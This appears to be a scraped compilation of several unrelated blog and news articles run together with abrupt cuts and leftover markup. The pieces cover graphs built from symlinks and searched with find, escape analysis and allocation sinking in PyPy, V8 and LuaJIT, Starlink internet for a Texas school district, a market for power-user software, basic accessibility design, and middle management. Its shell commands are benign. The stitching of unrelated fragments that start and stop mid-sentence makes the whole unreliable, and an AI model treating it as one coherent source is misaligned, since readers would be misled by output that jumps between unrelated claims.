lists. Let us try this with a simple example:</p>

<figure>
    <img src="https://blog.3fx.ch/post/images/graph.svg" width="100%"> 
</figure>


<p>We can create the graph as follows:</p>

<pre><code>% mkdir `seq 0 5`
% ln -s ../0 1
% ln -s ../1 0
% ln -s ../2 0
% ln -s ../0 2
% &lt;continue for each edge&gt;
% tree
.
├── 0
│&nbsp;&nbsp; ├── 1 -&gt; ../1
│&nbsp;&nbsp; └── 2 -&gt; ../2
├── 1
│&nbsp;&nbsp; ├── 0 -&gt; ../0
│&nbsp;&nbsp; └── 2 -&gt; ../2
├── 2
│&nbsp;&nbsp; ├── 0 -&gt; ../0
│&nbsp;&nbsp; ├── 1 -&gt; ../1
│&nbsp;&nbsp; └── 4 -&gt; ../4
├── 3
│&nbsp;&nbsp; └── 4 -&gt; ../4
├── 4
│&nbsp;&nbsp; ├── 2 -&gt; ../2
│&nbsp;&nbsp; ├── 3 -&gt; ../3
│&nbsp;&nbsp; └── 5 -&gt; ../5
└── 5 &nbsp;&nbsp;
    └── 4 -&gt; ../4
</code></pre>

<p>Now let us look at the same problem as before: We want to specify two vertices i
and j, and want to find a path between them (if it exists).  Last time we used
the <code>find(1)</code> utility to find these. This time we will explicitly tell <code>find</code> in
which vertex i we would like to start by specifying it as the root of our
search:</p>

<pre><code>% find 0/ -name 1
0/1
% find 0/ -name 3
&lt;nothing&gt;
</code></pre>

<p>Hmm, it seems as if <code>find</code> does not follow the symbolic links. Looking at
<code>find</code>’s manual page (<code>man find</code>) we see the following</p>

<pre><code>OPTIONS The  -H, -L and -P options control the treatment of symbolic links.

[...]

-P     Never  follow  symbolic  links.  This is the default behaviour.  When
       find examines or prints …</code></pre></article></div></div>

<p>With software engineering, speed and memory are the basic measurement-benchmarks. For programming language implementations, the two affect each other heavily. In JIT compilers, that means storing more things in memory to speed up the program drastically. It also means putting time into garbage collection to keep memory down, spending time to try to eliminate allocations and deciding where to put some piece of data. </p>
<p>Escape Analysis is a technique that determines the behaviour of how a variable (more specifically, a pointer) is used in a certain scope, and whether it not it escapes that scope (the scope is usually a function). Escape analysis allows the program to stack allocate (here is an article on <a href="https://stackoverflow.com/questions/79923/what-and-where-are-the-stack-and-heap/80113#80113">Stack vs Heap </a>allocations) when it's determined the variable will not be used outside of the scope or in other cases, try to eliminate the allocation completely. </p>

</h3>
<p>Pypy puts a lot of work into minimizing <em>boxing</em>, which is done through escape analysis. Boxing is when a primitive is boxed into an object wrapper type, such as an <code>int</code> to <code>Integer</code> in Java. Object oriented language implementations often utilize boxing (sometimes called auto-boxing), including JavaScript, C#, Haskell and others! Computers natively understands types like booleans and integers, but not objects, and unfortunately many languages need to store most of their data as an object and not the primitive. For example, <code>314</code> as a constant can be stored as a primitive on the stack, but when <code>314.toString()</code> is executed, <code>314</code> has to be boxed so that the method can be run on the object. Unboxing is performed to extract the value. </p>
<p>Boxing and unboxing is an expensive operation, with .NET citing 20x the time for boxed assignment and 4x the time for unboxing assignment (when you explicitly cast back). Pypy also has expensive boxing operations, as it's not just assigning/computing more values but organizing them into a heap structure. </p>
<p>Pypy considers this to be its second most important problem, and uses "virtual objects", also called virtualisation. It's a fancy term that means they avoid creating the entire heap structure, store the primitive value (not on the heap) and mock any object-operations that need to happen. While the virtual object is used in some applicable scope, read and writes are done to the virtual object without the expense of boxing/unboxing. Even more computation is saved as since the virtual object exists and no guards need to exist to verify information about the value in the object, whereas guards are usually in place to check the class after loading a value. </p>
<p>Pypy will virtualise onto the stack optimistically and then allocate later should it become necssary. Escape analysis is really powerful in JITs mostly because jitted langauges tend to be more dynamic, but also because they can very aggressively stack allocate.  Languages that compile once have to be completely confident that the escape analysis is valid (or also compile code in case of failure) <em>and</em> make decisions about how far it should look to determine a scope. JITs can kind of just hope it'll work and then actually do the allocation if it doesn't -- and remember what happened for next time (though that makes it sound a lot easier than it actually is). </p>
<p>For example;</p>
<pre><code><span>x </span><span>= </span><span>0
</span><span>for </span><span>i </span><span>in </span><span>range</span><span>(</span><span>10000</span><span>):
  </span><span># Integer.random() is not an actual stdlib operation in Python, I used it to indicate a non-primitive object is created
  </span><span>y </span><span>= </span><span>Integer</span><span>.</span><span>random</span><span>() </span><span>+ </span><span>x
  x </span><span>+= </span><span>y </span><span>* </span><span>4 </span><span># this would also involves boxing without escape analysis, since operators are implemented as methods
</span><span>print</span><span>(x)
</span></code></pre>
<p>There are two cases of virtualisation here. The first is <code>y</code>, which will be virtualised as it does not escape. Thus in the second line of the loop, Pypy would no longer need a guard for the value of <code>y</code>. This saves us a lot more than just constructing and traversing the heap structure. When boxed, Pypy has to check the class types of <code>y</code> and <code>x</code> due to the dynamic-ness of Python -- can these values be added? If they can, where is the method to describe how they are added (Python allows operator overloading). It also has to recreate a boxed object to reassign to <code>y</code> and in more complex cases could leave behind additional garbage for the GC. </p>
<p><code>x</code> on the other hand, does escape, but it's still valuable to virtualise it, for that allocation is in a loop and the escape is outside the loop. When a jump instruction comes in (loop ends), it’ll come with code that actually allocates <code>x</code> for the garbage collector and future use. Another case of escape analysis can be found in methods;</p>
<pre><code><span>def </span><span>foo</span><span>():
  x </span><span>= </span><span>{</span><span>"A"</span><span>: </span><span>1</span><span>, </span><span>"B"</span><span>: </span><span>2</span><span>}
  </span><span>return </span><span>x[</span><span>"A"</span><span>]
</span></code></pre>
<p>In this case, <code>x</code> will likely never escape and the allocation isn't even needed to execute the rest of the function. This particular case may actually be constant-folded away (the constant is replicated at usage sites), but abstractions of this pattern will use escape analysis. Escape analysis also often takes place for language-internal operations, and I'll describe how Javascript features and internals makes escape analysis very important. </p>
<h3 id="how-javascript-uses-escape-analysis-in-language-internals">How Javascript Uses Escape Analysis in Language Internals<a href="#how-javascript-uses-escape-analysis-in-language-internals" aria-label="Anchor link for: how-javascript-uses-escape-analysis-in-language-internals"> <i></i></a>
</h3>
<p>The most complex question about escape analysis (other than maybe "how do I implement it") is probably "is this only beneficial to very shortlived variables, and if so how does it help much?". As mentioned in the Pypy example, it is sometimes to protect allocations that are made by the language implementation rather than the programmer. Here's a quick example in Javascript (example token from <a href="https://www.jfokus.se/jfokus18/preso/Escape-Analysis-in-V8.pdf">this PDF</a>, which has a <a href="https://www.youtube.com/watch?v=KiWEWLwQ3oI">corresponding talk</a> that might be elementary at this point in the blog post). </p>
<pre><code><span>function </span><span>bar</span><span>(</span><span>o</span><span>) </span><span>{
  </span><span>return </span><span>Math</span><span>.</span><span>sqrt</span><span>(</span><span>o</span><span>.</span><span>x</span><span>*</span><span>o</span><span>.</span><span>x </span><span>+ </span><span>o</span><span>.</span><span>y</span><span>*</span><span>o</span><span>.</span><span>y)
</span><span>}

</span><span>function </span><span>foo</span><span>(</span><span>i</span><span>) </span><span>{
  </span><span>return </span><span>bar</span><span>(</span><span>{</span><span>x: </span><span>i</span><span>, y: </span><span>i}</span><span>)
</span><span>}
</span></code></pre>
<p>One might not expect anything to allocate even without escape analysis, but when you create the object to pass into <code>bar</code> it is created and allocated by default since it now exists for <code>bar</code> and can escape <code>bar</code>. This is a good example of a full allocation elimination, the allocation isn't just moved into the stack, rarther <code>bar</code> is inlined and then the usage of any object at all can be optimized away. </p>
<h3 id="luajit-allocation-sinking">LuaJIT Allocation Sinking<a href="#luajit-allocation-sinking" aria-label="Anchor link for: luajit-allocation-sinking"> <i></i></a>
</h3>
<p>In most languages that box, essentially everything gets a box (except <code>null</code> and <code>undefined</code> types, though <code>NaN</code> in Javascript is boxed into a <code>Number</code> so terms and conditions may apply). LuaJIT is smarter off the bat and manages to not box floats and is good at not allocating (when I say "allocate", I mean to the heap) constants. </p>
<p>LuaJIT's does something called <a href="http://wiki.luajit.org/Allocation-Sinking-Optimization"><em>Allocation Sinking</em></a>, which is based on escape analysis and the result is very powerful allocation removals, doing things that even the age-old Hotspot can't do. Pypy implemented a vast majority of the things that LuaJIT did (see this <a href="http://www1.maths.lth.se/matematiklth/vision/publdb/reports/pdf/ardo-bolz-etal-dls-12.pdf">2012 paper</a>) though I'd want to describe some of these optimizations in the context of LuaJIT rather than Pypy because LuaJIT gave me free examples. </p>
<p>When data is allocated, there's typically a "store" and then a "load" later on. Store-to-load forwarding is essentially what it sounds like, getting the subsequent "load" function to receive data directly from the location of storing. This is used to have powerful allocation sinking, more commonly called "code motion" (or specifically, loop-invariant code motion as JITs tend to be concerned with loop optimizations). This examples do not use executable Lua code</p>
<pre><code><span>local </span><span>x </span><span>= </span><span>0
</span><span>for </span><span>i</span><span>=</span><span>1</span><span>,</span><span>1000 </span><span>do
  </span><span>x </span><span>= </span><span>y </span><span>+ </span><span>z </span><span>-- i don't think this actually allocates in lua, but let’s pretend it does
  </span><span>local </span><span>a </span><span>= </span><span>i </span><span>+ </span><span>x
</span><span>end
</span></code></pre>
<p>What we want is for <code>x</code> to be declared outside of the loop, as it saves us that allocation every time we iterate. This could be done through code motion. </p>
<pre><code><span>local </span><span>x </span><span>= </span><span>y </span><span>+ </span><span>z 
</span><span>for </span><span>i</span><span>=</span><span>1</span><span>,</span><span>1000 </span><span>do
  </span><span>a </span><span>= </span><span>i </span><span>+ </span><span>x
</span><span>end
</span></code></pre>
<p>In the example below, the allocation of <code>i</code> to <code>y</code> should be moved to be inside the conditional. Note that this optimization is not quite covered by the base strategy described for Pypy.</p>
<pre><code><span>for </span><span>i</span><span>=</span><span>1</span><span>,</span><span>1000 </span><span>do  
  local </span><span>y </span><span>= </span><span>i
  </span><span>if </span><span>random</span><span>() </span><span>&gt; </span><span>0.5</span><span>:  </span><span>-- but does not escape this if statement
    </span><span>x </span><span>= </span><span>y </span><span>+ </span><span>z
  </span><span>local </span><span>a </span><span>= </span><span>i </span><span>+ </span><span>x
</span><span>end
</span><span>-- should become
</span><span>for </span><span>i</span><span>=</span><span>1</span><span>,</span><span>1000 </span><span>do  
  if </span><span>random</span><span>() </span><span>&gt; </span><span>0.5</span><span>: 
    </span><span>local</span><span> </span><span>y </span><span>= </span><span>i
    x </span><span>= </span><span>y </span><span>+ </span><span>z
  </span><span>local </span><span>a </span><span>= </span><span>i </span><span>+ </span><span>x
</span><span>end
</span></code></pre>
<p>Here, LuaJIT defers the write and <em>forwards</em> the data to the read. As a result, the allocation and read is very much removed. The forwarding destination is the point of escape, which is where the escape analysis comes in. </p>
<p>LuaJIT has an explicit mark-and-sweep pass to do sinks. For an example that highlights the allocation sinking, LuaJIT performed on par with C++ and 700x faster than Lua. Specifically (taken from the <a href="http://wiki.luajit.org/Allocation-Sinking-Optimization#implementation%5B">LuaJIT Blog</a>): </p>
<pre><code><span>local </span><span>ffi </span><span>= </span><span>require</span><span>(</span><span>"ffi"</span><span>)
</span><span>local </span><span>point
point </span><span>= </span><span>ffi</span><span>.</span><span>metatype</span><span>(</span><span>"struct { double x, y; }"</span><span>, </span><span>{
  </span><span>__add </span><span>= </span><span>function</span><span>(</span><span>a</span><span>, </span><span>b</span><span>)
   </span><span>return </span><span>point</span><span>(</span><span>a</span><span>.</span><span>x </span><span>+ </span><span>b</span><span>.</span><span>x, </span><span>a</span><span>.</span><span>y </span><span>+ </span><span>b</span><span>.</span><span>y)
  </span><span>end
</span><span>}</span><span>)
</span><span>local </span><span>a</span><span>, </span><span>b </span><span>= </span><span>point</span><span>(</span><span>1.5</span><span>, </span><span>2.5</span><span>), </span><span>point</span><span>(</span><span>3.25</span><span>, </span><span>4.75</span><span>)
</span><span>for </span><span>i</span><span>=</span><span>1</span><span>,</span><span>100000000 </span><span>do </span><span>a </span><span>= </span><span>(</span><span>a </span><span>+ </span><span>b</span><span>) </span><span>+ </span><span>b </span><span>end
</span><span>print</span><span>(</span><span>a</span><span>.</span><span>x, </span><span>a</span><span>.</span><span>y)
</span></code></pre>
<p>This example does some things that are familiar from the Pypy example -- it creates temporary objects while performing the arithmetic (<code>point(a.x + b.x, a.y + b.y)</code>). These two under-the-hood allocations are expensive, but LuaJIT optimizes …</p></section></div>

<p><span>Elon Musk: SpaceX is gearing up to make satellite Internet available to the education sector in a bid to bridge the digital divide.</span></p>
<p><span>SpaceX’s Starlink satellite internet service is <a href="https://www.de24.news/2020/10/spacexs-starlink-to-provide-free-satellite-internet-to-families-in-the-texas-school-district.html" target="_blank" rel="noopener noreferrer">collaborating</a> with a Texas school district to make free broadband available to several families in the surrounding rural area by 2021. This is the first time Elon Musk’s aerospace company has partnered with a school district to use Starlink to the Ector County Independent School District, which announced the collaboration on Oct. 20th.</span></p>
<p><iframe src="https://www.youtube.com/embed/Pe13MqRa2Wg" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
<p><span>The school district will initially provide 45 families living in rural Pleasant Farms with high-speed internet, before extending the service to 90 other families. According to a local media company, Odessa America, the project will set the company back a whopping $300,000 with half of the funding coming from education advocacy group Chiefs for Change.</span></p>
<p><span>“Our research clearly shows that the lack of broadband access is a crisis in Ector County,” the school district’s superintendent Scott Muri said in a statement.</span></p>
<p><span>The district, west of Dallas, Texas, needs broadband access to enable online learning during the coronavirus pandemic, which has led to schools across the country being closed or restricted to the number of students in physical classrooms. The district’s own surveys show 39 percent of families either have limited or no access to the Internet. SpaceX’s Starlink has accepted the challenge to fill this gap.</span></p>
<p><span>The company’s system currently dols out download speeds of 100 Mbps, with a latency of around 30 milliseconds, which is similar to the ground-based Internet. SpaceX plans to bring satellite internet to Texas, an American state in the lower latitudes. The company has assured it will soon be rolling out a public beta for Starlink, but in the higher latitudes for locations in the northern US and southern Canada.</span></p>
<p><span>By next year, SpaceX plans to put more satellites into orbit in its attempt to power the Starlink network, and enhance broadband coverage. Starlink operates more than 800 satellites, but the target is to have thousands more in orbit. The company is expected to roll out the satellite Internet system to users around the world in 2021, however, details about the cost are still scarce.</span></p>
<p><span>The Ector County’s Independent School District believes that Starlink will permanently fix and solve the broadband problems across the state.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>   <p>TL;DR: Just how big is the recently-hyped “Tools of Thought” market? Maybe there’s so many people on the web now you can actually make a business selling sports cars to the intellectual elite?</p> <hr> <p>During the first dot-com bubble, the Internet had 4M people. Today it has over 2B. That’s kind of obvious. What’s less obvious is the double growth: not just in <em>number</em>, but also in <em>quality</em>. This isn’t the generation who got computers when they were 50. These are a new generation that was born online. The mode Internet user is much more likely to care about keyboard shortcuts.</p> <p>Said differently, we now have a large market of “bionic users”. People who are half melded into the machine. Users that like keyboard shortcuts, care about speed, care about productivity, etc. (Some people call these “prosumers”, but that term feels as jaded as Apple’s Aqua UI.)</p> <p>The first company I started was a search engine. We were acquired by Apple, and our product was melded into Spotlight. The pitch was sleek, hyperfast search across all of your personal data. We tried both consumer and enterprise markets, but we found most success in the third market of high-end power users. The issue was it was 2010. It’s really fun building for the bionic elite, but there wasn’t enough of them to justify a long term business.</p> <p>Several things have changed since:</p> <ul> <li>It is technically easier to pay for things on the Internet.</li> <li>It is <em>emotionally</em> easier to pay for things on the Internet. It’s something you do frequently.</li> <li>There are more power users on the Internet who care about high-octane fast software. Partially because there are more software developers now, and software developers are often bionic users.</li> <li>There are more people on the Internet with the ability to pay for it.</li> <li>It is easier to reach those people.</li> </ul> <p>I think this effect fueled the early growth of companies like <a href="https://roamresearch.com/">Roam Research</a>, <a href="https://notion.so/">Notion</a>, <a href="https://airtable.com/">Airtable</a>, <a href="https://superhuman.com/">Superhuman</a>, <a href="https://zapier.com/">Zapier</a>, <a href="https://getpocket.com/">Pocket</a>, and others. Some of those achieved scale by going upmarket and charging enterprises for collaboration features, but it’s possible that you could have a material business selling to power users alone. It’s also worth noting the alternative take on this: pure enterprise. <a href="https://retool.com/">Retool</a> is a good example of this, forgoing the appeal to the bionic and focusing on deployment within a company. (Others mentioned have an enterprise component too. Everyone does everything. I think the key distinction is in the heart and soul of the company. Is self-serve the first or second act? Slice by that.)</p> <h4 id="tam">TAM</h4> <p>There are anywhere between 6-50M software developers in the world. According to Wikipedia, Github has 40M active users. The more reasonable estimates I’ve found are closer to 23M software developers. To me, this is a good rough sizing of the bionic market. That is, it’s probably &gt; 1M and &lt; 100M. (I would appreciate any deeper analysis of this if anyone has it!)</p> <h4 id="high-octane-software">High Octane Software</h4> <p>The first is a very liberating one to those that have productivity at heart: Yes you can! You can focus on 50ms response time, autocomplete, eye tracking, or whatever whacky idea you have to make something really, really nifty.</p> <h4 id="bionic-bundling">Bionic Bundling</h4> <p>Maybe Notion and Roam Research should get married? Apple Music and Microsoft Teams were a great tour de force of the power of bundling and having established sales channels. It is interesting to think of who might build the reseller channel to power users. This is the type of thing you earn the right to build – so I’d imagine it would be one of the Bionic Incumbents doing this first.</p> <h4 id="bionic-bootstrapping">Bionic Bootstrapping</h4> <p>If you’ve made it this far, congratulations! You’re somewhat of a determined reader to slog through this morass of words I’ve cobbled together. If you’re curious to get validation on a labor of love you’re working on, you should check out Pioneer. That’s kind of why we made it. I’m not going to link to it here, because I presume a true bionic user can easily find it themselves. (Scroll down!)</p> </article></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>According to the World Health Organization (WHO), about 15% of the world's population lives with some form of disability. That seemingly small percentage makes up more than 1 billion of the world’s population. In other words, about 1 out of 8 people will have difficulty navigating through design that is only made for “the average person”.</p>
<!--more-->
<p>When you’re attempting to understand accessibility, it’s important to listen to and interact with real people with disabilities in your research. What do they need? What kinds of designs are burdensome to them? What has worked for them so far, and what hasn’t?</p>
<blockquote>
<p>Understanding their needs requires empathy, and empathy is the foundation for good, inclusive, and accessible design.</p>
</blockquote>
<p>If you’re just starting out on understanding accessibility, this breakdown might be helpful to you. Here are five basic aspects of design that you should pay attention to when designing for accessibility.</p>
<h2><strong>Language</strong></h2>
<p>When it comes to the words on your digital product, use simple language and avoid jargon to cater to users on all levels of language proficiency. Simple language includes all, but complex language excludes people who only use the language on a basic level.&nbsp;</p>
<p>Use non-textual cues like pictures and colors&nbsp;to include non-literate users, and allow voice input and autocomplete text fields to accommodate people who aren't able to use keyboards.</p>
<p>When writing for accessibility, it's always important to optimize content for people who use assistive technology like screen readers. This includes being specific with button labels, and giving context to action buttons. For example, “Add to Cart” would be more understandable than just “Add”, because it mentions the subject of the action.</p>
<h2><strong>Color and Contrast</strong></h2>
<p>Avoid using design that solely depends on color to be understood. Take Google Maps for example — red is used to indicate traffic congestion, and green to indicate clear roads. But along with that, they also include a brief breakdown on the traffic condition in text, and provide the option for voice directions.&nbsp;</p>
<p>If you have to use design that depends on color, it’s always good to include labels or other visual cues. Otherwise, make use of contrast to help users with low vision and color blindness interact with and better understand color-coded visual cues.</p>
<p>Contrast is important for users to distinguish between text and non-text elements. This is required for good readability for not only the visually impaired, but also able-bodied users. Under bright sunlight or with low screen brightness, a bad contrast ratio would negatively affect any user’s experience on your app or website.</p>
<p><a href="https://www.w3.org/TR/UNDERSTANDING-WCAG20/visual-audio-contrast-contrast.html"><span>W3C</span></a> recommends a minimum contrast ratio of 3:1 for large text (14pt bold or 18pt regular and above), and 4.5:1 for smaller text or when visual impairment is accounted for.&nbsp;</p>
<h2><strong>Hierarchy</strong></h2>
<p>Your UI should have a simple and clear hierarchy of importance. For example, action items should be positioned at the top or bottom of the screen, or have shortcuts for easy access.</p>
<p>The reason why important elements are recommended to be at the top of the screen isn’t only because it’s common. It also helps with accessibility by including people who use screen readers. When these users explore the elements on a screen by touch, they experience an interface linearly, from top to bottom.&nbsp;</p>
<p>Since screen readers rely on the top-down structure of HTML, for accessibility’s sake, it’s important for developers and designers to keep the top-bottom left-right visual hierarchy in mind when deciding on the arrangement of elements including images, texts, and buttons.</p>
<h2><strong>Privacy and Security</strong></h2>
<p>Privacy isn’t something most of us have to think too much about, but it is for users with vision or hearing impairments, or simply those who depend on voice commands, assistive technology, or other people to complete tasks. Making private information secure is important in order to make your website or app accessible beyond the able-bodied user.</p>
<p>One way to do that is by providing controls for personal information to be hidden when prompted, or require extra permission before allowing private information to be accessed or read aloud.</p>
<h2><strong>Devices</strong></h2>
<p>Last but not least, don’t assume everyone uses the latest tech on the newest devices. Include older models and humble devices when you design — use responsive design to include smaller sized screens, offer lite versions of your app or simplified versions of your website, and use design that demands minimal battery usage.&nbsp;</p>
<p>After all, lighter works for everyone including those with the newest tech, but heavier may leave out a good bunch.</p>
<h2><strong>We’ve Got More</strong></h2>
<p>This barely scratches the surface on accessibility, but if you’re interested in more technical breakdowns on design and accessibility, you’re in for a treat — there’s a lot in the works!&nbsp;</p>

Let’s take a look at how communication and decision making evolve as companies grow larger.</p><p>Here’s how many companies begin: <br><img src="https://middle-out.io/images/genghis/2company.png" alt="2 people companies"></p><p>Two founders, working closely to get their new startup off the ground.</p><p>A more mature company might look more like this:<br><img src="https://middle-out.io/images/genghis/k3company.png" alt="Small company"></p><p>That’s Google circa 1999. Individuals hold increasingly defined roles. Management and process are beginning to creep in, but all anyone really wants to do is get on with things, management be damned. Grabbing a colleague to discuss something is as easy as shouting across the office.</p><p>But as companies grow larger, the majority end up looking more like this:<img src="https://middle-out.io/images/genghis/3comp.png" alt="Large company"></p><p>This is of course an over-simplification as every organization maintains informal networks, cross-functional teams, and parallel networks. But it is a useful representation to understand how hierarchies simplify the sharing of information by creating highways for it. Additionally, we will assume that every team operates in a mesh (even if we were not skilled enough to draw those relations).</p><p>See those ‘o’ nodes? That’s middle management. Layers and layers of it. Its main purpose is to simplify decision making and communication by concentrating ownership of different parts of the business in the hands of a select few.</p><figure><d-figure id="boldify"><div svelte-1667065745=""><p>For the more mathematically inclined, middle management splits the previously shown complete graphs with <span><span><span><math><semantics><mrow><msub><mi>K</mi><mi>n</mi></msub><mo>=</mo><mfrac><mrow><mi>n</mi><mo>(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo>)</mo></mrow><mrow><mn>2</mn></mrow></mfrac></mrow><annotation encoding="application/x-tex">K_n = \frac{n(n-1)}{2}</annotation></semantics></math></span></span></span> edges into multiple complete subgraphs with <span><span><span><math><semantics><mrow><msub><mi>M</mi><mi>n</mi></msub><mo>=</mo><msubsup><mo>∑</mo><mi>i</mi><mi>n</mi></msubsup><msub><mi>K</mi><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">M_n = \sum_i^nK_{m(i)+1}</annotation></semantics></math></span></span></span> edges, where <span><span><span><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span></span></span> runs over managers and <span><span><span><math><semantics><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">m(i)</annotation></semantics></math></span></span></span> is the number of people they manage. We assume that reporting edges correspond to lines of communication and that members of a team are fully connected in complete graphs.</p></div></d-figure></figure><p>The benefits are clear. When CEO Genghis or Kublai, another middle manager, want to figure out what’s going on with the Foobar team (highlighted above in Millenial pink), all they need do is call Subotai. By concentrating ownership of Foobar in Subotai’s hands, his team is shielded from unnecessary communication, allowing them to focus on their work.</p><figure><d-figure id="boldify"><div svelte-1667065745=""><p>To illustrate: <span><span><span><math><semantics><mrow><msub><mi>K</mi><mrow><mn>5</mn><mn>0</mn><mn>0</mn><mn>0</mn></mrow></msub><mo>=</mo><mn>1</mn><mn>2</mn><mo separator="true">,</mo><mn>4</mn><mn>9</mn><mn>7</mn><mo separator="true">,</mo><mn>5</mn><mn>0</mn><mn>0</mn></mrow><annotation encoding="application/x-tex">K_{5000} = 12,497,500</annotation></semantics></math></span></span></span>, but introducing 556 managers<sup>1</sup> each with <span><span><span><math><semantics><mrow><mi>m</mi><mo>(</mo><mi>i</mi><mo>)</mo><mo>=</mo><mn>1</mn><mn>0</mn></mrow><annotation encoding="application/x-tex">m(i) = 10</annotation></semantics></math></span></span></span> reports gives <span><span><span><math><semantics><mrow><msub><mi>M</mi><mrow><mn>5</mn><mn>5</mn><mn>6</mn></mrow></msub><mo>=</mo><mn>3</mn><mn>0</mn><mo separator="true">,</mo><mn>5</mn><mn>8</mn><mn>0</mn></mrow><annotation encoding="application/x-tex">M_{556} = 30,580</annotation></semantics></math></span></span></span>.

While the ‘x’ nodes focus on the work at hand, the ‘o’ nodes are busy talking and aligning amongst themselves. This creates two problems: the ‘o’s lose touch with the actual work being done, while the ‘x’s cannot easily see, communicate, or influence beyond team boundaries. Which, remember, is why you’ll be surprised when Beezlyboo lands on your desk in two weeks' time.</p><h3>What Companies Are Doing About This Today</h3><p>So far we've been talking about idealized companies. In reality, there are informal networks that permeate company hierarchies. There are also good and bad ‘x’s and ‘o’s. We know a lot about what a good ‘o’ is (or should be). There’s an <a href="https://www.forbes.com/sites/vickyvalet/2019/03/19/americas-best-management-consulting-firms-2019/#656906003d00">entire industry out there dedicated to this</a>, complete with degrees (MBAs) and reading material (those management books you tend to find in airport bookshops).</p><p>One thing ‘o’s obsess over is how best to organize things, which is great. That's their job, after all. The problem is that their solutions are often clunky. Do any of these sound familiar?</p><ul><li><b>Culture stuff:</b> the ‘o’s realize the company’s formal and informal hierarchies are too strong, so they begin promoting things like guilds, societies, team building activities, random coffee catchups between senior leads and juniors, etc.</li><li><b>Reorgs:</b> featuring endless tweaks to the traditional hierarchical org structure (functional, divisional, matrix/cross-functional… you name it). Ironically, it’s the ‘o’s that instigate these —  often to the complete bewilderment of the ‘x’s.</li><li><b>Surveys:</b> because making the ‘x’s click through an annoying ten-page annual survey is a great way of discovering how they really feel. Right? Right. </li></ul><p>If these solutions sound drab and disengaging, it's because they are. <a href="https://en.wikipedia.org/wiki/Ronald_Coase">Ronald Coase</a>, the 1991 Nobel laureate in economics, published an <a href="https://onlinelibrary.wiley.com/doi/full/10.1111/j.1468-0335.1937.tb00002.x">influential essay in 1937</a> on why firms even appear, and mentions that the benefits of larger firms are quickly outweighed by the overheads of maintaining their complex hierarchies and the misallocations of resources which stem from this. In a more modern work, Gary Hammel and Michele Zanini demonstrate in <a href="https://www.humanocracy.com/">Humanocracy</a> -- another one of those airport books -- that:                </p><p>A <a href="https://www.gallup.com/workplace/236552/managers-engaged-jobs.aspx">2018 Gallup study</a> found two-thirds of US employees and 51 percent of US managers to be disengaged at work.</p><p>In 2018, there were 146 million employees in the US workforce. [...] Of these, 20.5 million were managers and supervisors. In addition, there were 6.4 million employed in administrative support functions. In total, then, the bureaucratic class comprises 26.9 million individuals or 18.4 percent of the US workforce. [...] claiming more than $3.2 trillion in compensation, or nearly a third of America’s total wage bill.</p><p>They argue that, if we could repurpose a fraction of this managerial bloat into more productive pursuits, we would free up a lot of unproductive excess wages and therefore raise productivity, overall compensation (for the rest of us), and employee engagement.</p><p><b>Genghis:</b> Okay, kiddo, that's great... but we're trying to run a Khanate company that stretches from eastern Europe to China. Maybe our team building activities are a little boring, and we do like a good reorg, especially after we invade acquire a new company, but what are you proposing? That we fire all our generals and officers and turn into those Valve hippies? <br><b>Ogedei (You):</b> Not at all. Hear me out.</p><h3>What the Future Might Look Like</h3><p>With everyone and <a href="https://www.itv.com/news/wales/2020-03-19/people-stuck-at-home-are-sharing-pictures-of-their-cat-and-dog-coworkers">their cat</a> — not to mention the <a href="https://www.oecd.org/future-of-work/">OECD</a> — talking about the Future of Work these days, isn’t it time we began trying to tackle company organization with more pizazz? You know, just throw some tech and AI at it.</p><p><b>Genghis:</b> Oh god, here we go again with your AI thing.<br></p><p>He's right: here we go.<sup>2</sup> One of the most significant transformations due to play out over the next decade is the <a href="https://www.cnbc.com/2019/06/20/slack-ceo-predicts-end-of-company-email-as-we-know-it-in-7-years.html">death of email</a> in within-company communications and its replacement by tools like Slack and Teams. Not only do Slack and Teams introduce a new medium for companies to communicate in, they also allow for modern third-party integrations via their APIs. That’s something email tools like Gmail or Outlook never quite got right.</p><p>On top of this, there's an unfolding generational shift. Millennials will continue to graduate to positions of power as the 2020s progress — and they’ve grown up using online chat protocols and social networks.</p><p><b>Ogedei:</b> So here’s the thing, Dad. The way we organize ourselves in companies will change because young people like me communicate in new and different ways.</p><p>The first wave of startups attempting to tackle this — like <a href="https://knowyourteam.com/">Know Your Team (KYT)</a>, <a href="https://www.ally.io/">Ally</a>, <a href="https://lattice.com/">Lattice</a>, <a href="https://www.donut.com/">Donut</a>, <a href="https://withcadence.io/">Cadence</a>, and a handful of others — are already well on their way.</p><p>Let's take KYT as an example. It's a fantastic tool that takes the magic of being a good 'o' and pours it into a suite of effective communication tools to help you manage your reports. Backed by years of research and a kick-ass CEO in <a href="https://clairelew.com/">Claire Lew</a>, KYT is a great example of a company pushing the envelope of how we think about management.</p><figure><d-figure id="boldify"><div svelte-1667065745=""><div><p>If middle managers in today’s corporations are obsessed with airport books and ways of organizing people, then the true organizational geeks are military commanders and theorists. Organizing militaries has been a thing since time immemorial, from <a href="https://en.wikipedia.org/wiki/Sun_Tzu">Sun Tzu</a> to <a href="https://en.wikipedia.org/wiki/Carl_von_Clausewitz">Clausewitz</a>.<sup>3</sup></p><p>The Mongols weren’t too shabby either. Instead of Slack, they used a system of postal relays called <a href="https://en.wikipedia.org/wiki/Yam_(route)">Yam</a>. Instead of executive councils, they had <a href="https://en.wikipedia.org/wiki/Kurultai">Kurultais</a>. The Mongols adapted quickly and <a href="https://en.wikipedia.org/wiki/Religion_in_the_Mongol_Empire">didn't try to change the religious habits of conquered populations</a>. By virtue of necessity, they also had a <a href="https://www.britannica.com/place/Mongol-empire/Organization-of-Genghis-Khans-empire">pretty devolved leadership structure</a> — individual Khans ruled parts of the empire which were thousands of miles apart. We could learn a lot about how management can be done better from the Mongols.<sup>4</sup></p></div></div></d-figure></figure><h3>Rethinking How We Organize</h3><p>So if fully connected graphs don't scale, and if tight hierarchies are inefficient and soul-crushing, what else is there?</p><p>Say you're a middle manager. You report to someone, a few others report to you. A good 